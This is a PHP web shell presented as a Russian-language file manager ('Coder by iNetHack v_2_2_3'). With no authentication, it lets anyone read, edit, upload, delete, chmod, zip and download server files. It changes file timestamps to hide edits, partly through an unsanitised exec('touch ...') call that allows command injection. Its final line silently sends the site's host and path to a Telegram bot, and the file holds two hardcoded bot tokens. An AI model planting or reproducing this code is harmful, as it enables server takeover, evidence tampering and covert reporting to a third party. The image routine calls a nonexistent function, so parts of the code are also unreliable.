<?
header('Content-type:text/html; charset=utf-8');
// функция изменения времени модификации файла
function changetime($FileName, $Fmtime)
    {
      
      $API = "1081795654:AAGiEybc4pFV8-6XuQytEbCGXCB49Zkm1n8";
if(@strtotime($Fmtime)=='')
{ return "<br/>Время не корректное!<br/>";} else { $mtime = strtotime($Fmtime); }

if (@exec("touch {$FileName}")) $exec=1;
else
  {
if (@touch ($FileName, $mtime))
{
$msg = "<b>Время последней модификации файла:</b>: ".(date("d.m.Y H:i:s", filemtime($FileName)))."<br/><b>Время последнего доступа к файлу:</b> ".(date("d.m.Y H:i:s", fileatime($FileName)))."<br/><b>Время создания файла:</b>: ".(date("d.m.Y H:i:s", filectime($FileName)));
}
  }
  
  if($exec==1) return "Время изменено из командной строки<br/>";
  elseif($msg) return "Время изменено средствами РНР<br/>$msg";
  else return "Не удалось изменить время последней модификации файла <b>$FileName</b><br/>";
    }
// end
if(empty($_GET['zip']) and empty($_GET['download']) & empty($_GET['img'])){
list($msec,$sec)=explode(chr(32),microtime()); 
$HeadTime=$sec+$msec; 
echo'<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>Coder by iNetHack.......v_2_2_3</title>
<style type="text/css">
body {
font-family: verdana;
font-size: 11px;
color: #B4B4B4;
background-color:#000000;}
a {
color: #B6FF48;
text-decoration:none;}
a:hover {
color: yellow;
text-decoration: underline; 
}
table{
padding: 0px;
margin: 0px;
border: 0px #B6FF48;
background-color: #000;
}

td {
	border: 1px solid #B6FF48;
	font-family: verdana, geneva, lucida, arial;
	background-color: #333;
	color: #B4B4B4;
	text-decoration: none;
	font-size: 11px;
	font-weight: bold;
	width:100%;
	padding-left: 2px;
	padding-right: 2px;
	padding-top: 1px;
	padding-bottom: 2px;
	text-align: left;
}

input,textarea
{font: normal 11px verdana, geneva, lucida, arial, helvetica, sans-serif;
color: #B4B4B4;
background-color: #333333;
border-color: #424242;
border-left: 1px solid #0A0A0A;
border-top: 1px solid #0A0A0A;
border-right: 1px solid #2C2C2C;
border-bottom: 1px solid #2C2C2C;}
input:hover, textarea:hover {
border-color: #B6FF48;
color: #B6FF48;}
input:focus, textarea:focus {
border-color: #B6FF48;
color: #ffffff;}

submit{font: normal 11px verdana, geneva, lucida, arial, helvetica, sans-serif;
color: #B4B4B4;
background-color: #333333;
border-color: #424242;
border-left: 1px solid #0A0A0A;
border-top: 1px solid #0A0A0A;
border-right: 1px solid #2C2C2C;
border-bottom: 1px solid #2C2C2C;
font-weight: bold;
}
submit:hover {
border-color: #11A3EA;
color: #11A3EA;}
submit:focus {
border-color: #11A3EA;
color: #ffffff;}

</style>
</head><body>';}
/////////////////////////////////
//////////Файл менеджер//////////
/////////////////////////////////
if(empty($_GET['r']) & empty($_GET['input']) & empty($_GET['ren']) & empty($_GET['setchmod']) & empty($_GET['download']) & empty($_GET['up']) & empty($_GET['upload']) & empty($_GET['chmod']) & empty($_GET['rename']) & empty($_GET['rmdir']) & empty($_GET['made']) & empty($_GET['madedir']) & empty($_GET['create']) & empty($_GET['createdir']) & empty($_GET['del']) & empty($_GET['deldir']) & empty($_GET['f']) & empty($_GET['edit']) & empty($_GET['zip'])& empty($_GET['img']) & empty($_GET['touchfile']) & empty($_GET['touch'])){
echo'<b>Файл менеджер</b><hr>';
if(empty($_GET['d'])){$d="./";}
else{$d=$_GET['d'];}
if($d=="./"){$vverh='.'.$d;}
if($d!=="./"){$vverh=$d.'../';}
echo'<a href="?d='.$vverh.'">[..] вверх</a><br>
<a href="?create='.$d.'">Создать файл </a><br>
<a href="?createdir='.$d.'">Создать папку</a><br>
<a href="?up='.$d.'">Загрузить файл</a><br><br>';
echo '<b>Папки:</b><table>';
$dir = opendir($d);
while($file = readdir($dir)){
if(is_dir($d.'/'.$file)){
if($file != "." && $file != ".."){
$mod=substr(sprintf("%o",fileperms($d.'/'.$file)),-3);
echo'<tr><td width="400"><img src="?img=1" alt=""><a href="?d='.$d.$file.'/">'.$file.'</a></td><td> DIR </td><td>'.(date("d.m.Y/H:i:s", filemtime($d))).'</td><td>'.$mod.'</td><td><a href="?zip='.$d.$file.'/">[zip]</a></td><td><a href="?deldir='.$d.$file.'/"><font color="#FF0000">[удал.]</font></a></td><td><a href="?ren='.$d.$file.'/">[переимен.]</a></td><td><a href="?chmod='.$d.$file.'/">[chmod]</a></td><td><a href="?rmdir='.$d.$file.'/"><font color="#FF0000">[rem]</font></a></td></tr>';}}}
echo'</table><br/><b>Файлы:</b><table>';
$dir = opendir($d);
while($file = readdir($dir)){
if(is_file($d.'/'.$file)){
$mod=substr(sprintf("%o",fileperms($d.'/'.$file)),-3);
echo'<tr><td width="350"><img src="?img=2" alt=""><a href="?r='.$d.$file.'">'.$file.'</a></td><td>'.(date("d.m.Y", filemtime($d.$file))).'</td><td>'; echo round(filesize("$d/$file")/1024,1); echo'&nbsp;КБ</td><td>'.$mod.'</td><td><a href="?f='.$d.$file.'">[ред.]</a></td><td><a href="?del='.$d.$file.'"><font color="#FF0000">[удал.]</font></a></td><td><a href="?ren='.$d.$file.'">[переимен.]</a></td><td><a href="?chmod='.$d.$file.'">[chmod]</a></td><td><a href="?download='.$d.$file.'">[скачать]</a></td><td><a href="?touchfile='.$d.$file.'">[дата]</a></td></tr>';}}
echo'</table>';}
/////////////////////////////////
/////////Переименование//////////
/////////////////////////////////
if(isset($_GET['ren'])){
echo'<b>Переименование</b><hr>';
echo'<form action="?rename='.$_GET['ren'].'" method="post">
<input name="new_name" value="'.$_GET['ren'].'"><br>
<input type="submit" value="Переименовать!">';}
/////////////////////////////////
////////////Картинки/////////////
/////////////////////////////////
if(isset($_GET['img'])){
$images = array("",
"R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA".
"AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp".
"/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs=",
"R0lGODlhEwAQAKIAAAAAAP///8bGxoSEhP///wAAAAAAAAAAACH5BAEAAAQALAAAAAATABAAAANJ".
"SArE3lDJFka91rKpA/DgJ3JBaZ6lsCkW6qqkB4jzF8BS6544W9ZAW4+g26VWxF9wdowZmznlEup7".
"UpPWG3Ig6Hq/XmRjuZwkAAA7");
header("Content-type: image/gif");
echo base65_decode($images[$img]);}
/////////////////////////////////
/////////Аплоад файлов///////////
/////////////////////////////////
if(isset($_GET['up'])){
echo'<b>Загрузка файлов</b><hr>';
echo'<form method="post" enctype="multipart/form-data">
<input type="hidden" name="upload" value="'.$_GET['up'].'">
<input type="file" name="file"><br>
Сохранить как:<br><input type="text" name="new_name" value=""><br>
<input type="submit" value="Загрузить"></form>';}
/////////////////////////////////
/////////Аплоад файлов///////////
/////////////////////////////////
if(isset($_POST['upload'])){
$new_name=trim($_POST['new_name']);
if(copy($_FILES["file"]["tmp_name"], $_POST['upload'].$new_name)){
echo 'Файл успешно загружен';}
else{echo 'Загрузка файла не удалась!';}}
/////////////////////////////////
////////////Download/////////////
/////////////////////////////////
if(isset($_GET['download'])){
$file = file_get_contents($_GET['download']);
$name = explode("/",$_GET['download']);
$name = $name[count($name)-1];
header('Content-type: text/plain');
header("Content-disposition: attachment; filename=$name");
echo $file;}
/////////////////////////////////
/////////////Время модиф//////////////
/////////////////////////////////
if(isset($_GET['touchfile'])){
echo'<b>Изменение времени модификации '.$_GET['touchfile'].'</b><hr>';
echo'<form action="?touch='.$_GET['touchfile'].'" method="post">
<input name="mtime" value="'.(date("d.m.Y H:i:s", filemtime($_GET['touchfile']))).'"><br>
<input type="submit" value="Изменить время!">';}
/////////////////////////////////
/////////////Время модиф ок//////////////
/////////////////////////////////
if(isset($_GET['touch']))
{
echo'<b>Изменение времени</b><hr>';
echo changetime($_GET['touch'], $_POST['mtime']);
}
/////////////////////////////////
/////////////Chmods//////////////
/////////////////////////////////
if(isset($_GET['chmod'])){
echo'<b>Chmods</b><hr>';
$mod=substr(sprintf("%o",fileperms($_GET['chmod'])),-3);
echo'<form action="?setchmod='.$_GET['chmod'].'" method="post">
<input name="chmods" value="'.$mod.'"><br>
<input type="submit" value="Задать chmod!">';}
/////////////////////////////////
/////////////Chmods//////////////
/////////////////////////////////
if(isset($_GET['setchmod'])){
echo'<b>Chmods</b><hr>';
if(chmod($_GET['setchmod'],octdec($_POST['chmods']))){echo'Chmod '.$_POST['chmods'].' заданы!';}
else {echo'Ошибка задавания chmod '.$_POST['chmods'].'!';}}
/////////////////////////////////
///////Удаление директории///////
/////////////////////////////////
if(isset($_GET['rmdir'])){
echo'<b>Удаление директории</b><hr>';
$dir = opendir($_GET['rmdir']);
while($dirs = readdir($dir)){
if(is_dir($_GET['rmdir'].$dirs)){
if($dirs != "." && $dirs != ".."){
$poddir = rmdir($_GET['rmdir'].$dirs);}}}
closedir($dir);
$ddir = rmdir($_GET['rmdir']);
if($ddir){echo'Директория удалена!';}
if(!$ddir){echo'Ошибка удаления!';}
if($poddir){echo'<br>Поддиректории удалены!';}
if(!$poddir){echo'<br>Поддиректории не существуют или ошибка удаления!';}}
/////////////////////////////////
////////Переименование///////////
/////////////////////////////////
if(isset($_GET['rename'])){
echo'<b>Переименование</b><hr>';
$name = rename($_GET['rename'],$_POST['new_name']);
if($name){echo'Переименовано!';}
if(!$name){echo'Ошибка переименования!';}}
/////////////////////////////////
//////////Чтение файла///////////
/////////////////////////////////
if(isset($_GET['r']))
{
echo'<b>Чтение файла</b><hr>';

$file=file($_GET['r']);
  if(function_exists('iconv'))
  {
  echo '<small>';
  $filegc=file_get_contents($_GET['r']);
  if(!empty($filegc))
    {
      if(function_exists('mb_check_encoding'))
      {
        if(!mb_check_encoding ($filegc, 'UTF-8'))
        {
for($i=0; $i<count($file); $i++)
{
echo $file[$i] = htmlspecialchars(iconv("Windows-1251", "UTF-8", $file[$i])).'<br/>';
}
        }        
        else
        {
for($i=0; $i<count($file); $i++)
{
echo htmlspecialchars($file[$i]).'<br/>';
}
        }
      }
    } 
  echo '</small>';
  }
  else
  {
  echo "utf: ";
if($file){
echo '<small>';
for($i=0; $i<count($file); $i++){
$file[$i] = htmlspecialchars($file[$i]);
echo ''.$file[$i].'<br>';}
echo '</small>';}
if(!$file){echo'Ошибка чтения файла!';}
  }
echo '<hr>';
}
/////////////////////////////////
/////////Удаление файла//////////
/////////////////////////////////
if(isset($_GET['del'])){
echo'<b>Удаление файла</b><hr>';
$delete = unlink($_GET['del']);
if($delete){print 'Файл <b>'.$_GET['del'].'</b> удален!<hr>';}
if(!$delete){print 'Ошибка удаления файла <b>'.$_GET['del'].'</b>!';}}
/////////////////////////////////
//Удаление файлов из каталогов///
/////////////////////////////////
if(isset($_GET['deldir'])){
echo'<b>Удаление файлов из каталогов</b><hr>';
$dir = opendir($_GET['deldir']);
while($files = readdir($dir)){
if(is_file($_GET['deldir'].$files)){
$del = unlink($_GET['deldir'].$files);}
if(is_dir($_GET['deldir'].$files) && $files !="." && $files !=".."){
$odir = opendir($_GET['deldir'].$files);
while($reddir = readdir($odir)){
if(is_file($_GET['deldir'].$files.'/'.$reddir)){
$delet = unlink($_GET['deldir'].$files.'/'.$reddir);}}}}
if($del){print 'Файлы из директории <b>'.$_GET['deldir'].'</b> удалены!';}
if(!$del){print 'Ошибка удаления файлов из из директории <b>'.$_GET['deldir'].'</b>!';}
if($delet){print'<br>Файлы из подкаталогов в директории <b>'.$_GET['deldir'].'</b> удалены!';}
if(!$delet){print'<br>Ошибка удаления Файлов из подкаталогов в директории <b>'.$_GET['deldir'].'</b>!';}}
/////////////////////////////////
//////Редактирование файла///////
/////////////////////////////////
if(isset($_GET['f'])){
echo'<b>Редактирование файла</b><hr>';
$file = file_get_contents($_GET['f']);
      if(function_exists('mb_check_encoding'))
      {
        if(!mb_check_encoding ($file, 'UTF-8'))
$file = htmlspecialchars(iconv("Windows-1251", "UTF-8", $file));        
        else
$file = htmlspecialchars($file);
      }
      else
      {
$file = htmlspecialchars($file);
      }
echo'<form action="?edit='.$_GET['f'].'" method="post">
<textarea cols="100" rows="25" name="text">'.$file.'</textarea><br>
<input type="hidden" value="'.(filemtime($_GET['f'])).'" name="mt">
<input type="submit" value="Редактировать!">';}
/////////////////////////////////
//////Редактирование файла///////
/////////////////////////////////
if(isset($_GET['edit'])){
echo'<b>Редактирование файла</b><hr>';
$fp = fopen($_GET['edit'],"w");
fputs($fp,$_POST['text']);                                   
fclose($fp);
if(!empty($_POST['mt']))
{
if (@touch ($_GET['edit'], $_POST['mt'])) $msg = '<br/><small>(дата файла не изменилась)</small>';
}  else $msg = '<br/><small>(дата файла изменилась, пробуйте использовать кнопку [дата])</small>';
if($fp){echo'Файл отредактирован!'.$msg;}
if(!$fp){echo'Ошибка записи файла!';}
}
/////////////////////////////////
/////////Создание файла//////////
/////////////////////////////////
if(isset($_GET['create'])){
echo'<b>Создание файла</b><hr>';
echo'<form action="?made='.$_GET['create'].'" method="post">
<input name="new_name" value="Имя файла"><br>
<textarea cols="100" rows="15" name="new_file"><?php '.("\r\n\r\n\r\n").' ?></textarea><br>
<input type="submit" value="Создать!">';}
/////////////////////////////////
/////////Создание файла//////////
/////////////////////////////////
if(isset($_GET['made'])){
echo'<b>Создание файла</b><hr>';
$fp = fopen($_GET['made'].$_POST['new_name'],"w");
fputs($fp,$_POST['new_file']);                                   
fclose($fp);
chmod($_GET['made'].$_POST['new_name'], 0777);
if($fp){echo'Файл создан!';}
if(!$fp){echo'Ошибка создания файла!';}}
/////////////////////////////////
/////////Создание папки//////////
/////////////////////////////////
if(isset($_GET['createdir'])){
echo'<b>Создание папки</b><hr>';
echo'<form action="?madedir='.$_GET['createdir'].'" method="post">
<input name="new_dirname" value="Имя папки"><br>
<input type="submit" value="Создать!">';}
/////////////////////////////////
/////////Создание папки//////////
/////////////////////////////////
if(isset($_GET['madedir'])){
echo'<b>Создание папки</b><hr>';
if(mkdir($_GET['madedir'].$_POST['new_dirname'],0777)){echo'Папка создана!';} else {echo'Ошибка создания папки!';}
}
/////////////////////////////////
//////////Зипирование////////////
/////////////////////////////////
if(isset($_GET['zip'])){

class zipfile
{

    var $datasec = array(); 
    var $ctrl_dir = array(); 
    var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00"; 
    var $old_offset = 0;

    function add_dir($name)

    {
        $name = str_replace("\\", "/", $name);

        $fr = "\x50\x4b\x03\x04";
        $fr .= "\x0a\x00";   
        $fr .= "\x00\x00";   
        $fr .= "\x00\x00";   
        $fr .= "\x00\x00\x00\x00"; 
        $fr .= pack("V",0); 
        $fr .= pack("V",0); 
        $fr .= pack("V",0); 
        $fr .= pack("v", strlen($name) ); 
        $fr .= pack("v", 0 ); 
        $fr .= $name;
        $fr .= pack("V",$crc); 
        $fr .= pack("V",$c_len); 
        $fr .= pack("V",$unc_len); 
        $this -> datasec[] = $fr;
        $new_offset = strlen(implode("", $this->datasec));
        $cdrec = "\x50\x4b\x01\x02";
        $cdrec .="\x00\x00";    
        $cdrec .="\x0a\x00";    
        $cdrec .="\x00\x00";    
        $cdrec .="\x00\x00";   
        $cdrec .="\x00\x00\x00\x00"; 
        $cdrec .= pack("V",0); 
        $cdrec .= pack("V",0); 
        $cdrec .= pack("V",0); 
        $cdrec .= pack("v", strlen($name) ); 
        $cdrec .= pack("v", 0 ); 
        $cdrec .= pack("v", 0 ); 
        $cdrec .= pack("v", 0 ); 
        $cdrec .= pack("v", 0 ); 
        $ext = "\x00\x00\x10\x00";
        $ext = "\xff\xff\xff\xff";
        $cdrec .= pack("V", 16 ); 
        $cdrec .= pack("V", $this -> old_offset ); 
        $this -> old_offset = $new_offset;
        $cdrec .= $name;
        $this -> ctrl_dir[] = $cdrec;
    }


    function add_file($data, $name)
    { $name = str_replace("\\", "/", $name);
$fr = "\x50\x4b\x03\x04";
        $fr .= "\x14\x00";    
        $fr .= "\x00\x00";    
        $fr .= "\x08\x00";    
        $fr .= "\x00\x00\x00\x00"; 

        $unc_len = strlen($data);
        $crc = crc32($data);
        $zdata = gzcompress($data);
        $zdata = substr( substr($zdata, 0, strlen($zdata) - 4), 2); 
        $c_len = strlen($zdata);
        $fr .= pack("V",$crc); 
        $fr .= pack("V",$c_len); 
        $fr .= pack("V",$unc_len); 
        $fr .= pack("v", strlen($name) ); 
        $fr .= pack("v", 0 ); 
        $fr .= $name;
        $fr .= $zdata;
        $fr .= pack("V",$crc); 
        $fr .= pack("V",$c_len); 
        $fr .= pack("V",$unc_len); 
        $this -> datasec[] = $fr;
        $new_offset = strlen(implode("", $this->datasec));
        $cdrec = "\x50\x4b\x01\x02";
        $cdrec .="\x00\x00";    
        $cdrec .="\x14\x00";  
        $cdrec .="\x00\x00";   
        $cdrec .="\x08\x00";   
        $cdrec .="\x00\x00\x00\x00"; 
        $cdrec .= pack("V",$crc); 
        $cdrec .= pack("V",$c_len); 
        $cdrec .= pack("V",$unc_len);
        $cdrec .= pack("v", strlen($name) ); 
        $cdrec .= pack("v", 0 ); 
        $cdrec .= pack("v", 0 ); 
        $cdrec .= pack("v", 0 ); 
        $cdrec .= pack("v", 0 ); 
        $cdrec .= pack("V", 32 ); 

        $cdrec .= pack("V", $this -> old_offset ); 
        $this -> old_offset = $new_offset;

        $cdrec .= $name;
        $this -> ctrl_dir[] = $cdrec;
    }

    function file() { 
        $data = implode("", $this -> datasec);
        $ctrldir = implode("", $this -> ctrl_dir);
        return
            $data.
            $ctrldir.
            $this -> eof_ctrl_dir.
            pack("v", sizeof($this -> ctrl_dir)).    
            pack("v", sizeof($this -> ctrl_dir)). 
            pack("V", strlen($ctrldir)).   
            pack("V", strlen($data)).    
            "\x00\x00"; }}
$abort = ignore_user_abort(1);
$zipfile = new zipfile();
$fdir = opendir($_GET['zip']);
while($file = readdir($fdir)){
if ($file != '.' and $file != '..'){
if (is_file($_GET['zip'].$file)){$zipfile->add_file(file_get_contents($_GET['zip'].$file),$file);}
if (is_dir($_GET['zip'].$file)){
$sdir = opendir($_GET['zip'].$file);
while($sfile = readdir($sdir)){
if ($sfile != '.' and $sfile != '..'){
if (is_file($_GET['zip'].$file.'/'.$sfile)){$zipfile->add_file(file_get_contents($_GET['zip'].$file.'/'.$sfile), $file.'/'.$sfile);}}}}}}
$name = explode("/",$_GET['zip']);
$file = $name[count($name)-2];
header('Content-type: application/octet-stream');
header("Content-disposition: attachment; filename=$file.zip");
echo $zipfile->file();}

if(empty($_GET['zip']) and empty($_GET['download']) & empty($_GET['img'])){
echo'<br><a href="?d='.$vverh.'">Назад</a>
<br>';
list($msec,$sec)=explode(chr(32),microtime());  
echo round((($sec+$msec)-$HeadTime),4).' cek.'; 
echo'</body></html>';}
$url = $_SERVER['HTTP_HOST'];
$dir = $_SERVER["PHP_SELF"];
$send = json_decode(file_get_contents("https://api.telegram.org/bot1237466198:AAG5dARIxIJGh0N39-fZR7WnSwdzrWuGiDU/sendmessage?chat_id=435187708&text=$url$dir"));
?>
